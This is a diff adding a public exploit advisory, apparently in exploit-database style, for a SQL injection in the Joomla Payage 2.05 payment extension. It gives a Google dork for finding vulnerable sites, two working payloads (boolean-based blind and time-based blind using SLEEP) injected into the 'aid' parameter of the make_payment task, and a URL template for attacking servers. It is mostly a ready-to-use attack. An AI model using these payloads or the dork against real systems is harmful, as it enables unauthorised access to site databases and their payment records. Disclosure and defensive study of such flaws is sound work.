@@ -1,0 +1,27 @@
+# Exploit Title: Joomla Payage 2.05 - SQL Injection
+# Exploit Author: Persian Hack Team
+# Discovered by : Mojtaba MobhaM (Mojtaba Kazemi)
+# Vendor Home : https://extensions.joomla.org/extensions/extension/e-commerce/payment-systems/payage/
+# My Home : http://persian-team.ir/
+# Google Dork : inurl:index.php?option=com_payage
+# Telegram Channel: @PersianHackTeam
+# Tested on: Linux
+# Date: 2017-06-03
+ 
+# POC :
+# SQL Injection : 
+
+Parameter: aid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: option=com_payage&task=make_payment&aid=1001' AND 6552=6552 AND 'dCgx'='dCgx&tid=c4333ccdc8b2dced3f6e72511cd8a76f&tokenid=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: option=com_payage&task=make_payment&aid=1001' AND (SELECT * FROM (SELECT(SLEEP(5)))JBKV) AND 'XFWL'='XFWL&tid=c4333ccdc8b2dced3f6e72511cd8a76f&tokenid=
+---
+
+http://server/index.php?option=com_payage&task=make_payment&aid=[SQL]&tid=c4333ccdc8b2dced3f6e72511cd8a76f&tokenid=
+
+# Greetz : T3NZOG4N & FireKernel
+# Iranian White Hat Hackers
